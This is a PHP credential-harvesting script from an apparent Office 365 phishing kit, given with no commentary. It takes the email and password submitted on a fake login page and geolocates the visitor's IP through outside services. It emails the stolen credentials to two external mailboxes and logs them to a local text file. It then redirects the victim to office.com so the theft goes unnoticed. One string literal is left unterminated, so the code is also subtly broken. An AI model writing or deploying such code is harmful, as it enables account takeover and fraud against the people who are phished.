<?php
$ip = getenv("REMOTE_ADDR");$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$query2 = @json_decode(file_get_contents("https://api.ipdata.co/{$ip}"));
if($query && $query['status'] == 'success') {
  $ipDetails = 'This visitor visited from '.$query['country'].', '.$query['regionName'] .', '.$query['city'].' with IP Address of - '.$query['query'];
} else {
  $ipDetails = $ip. ' | '.@$query2->country . ' | '.@$query2->region. ' | '. @$query2->city ;

}

$message  = "========+[ Office 365 Login ]+=========\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "IP Details: " . $ipDetails."\n";
$message .= "Date And Time : ".$date."\n";
$message .= "Browser Details : ".$user_agent."\n";
$send = "tcoffice@yandex.com, tcsquad007@protonmail.com;
$subject = "Office 365 Login | $ip";
$headers = "From: Office365  <leleo@mastz.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message);
$fp = fopen("./wbn.txt","a");
fputs($fp,$message);
fclose($fp); 
header("Location: https://office.com");
?>
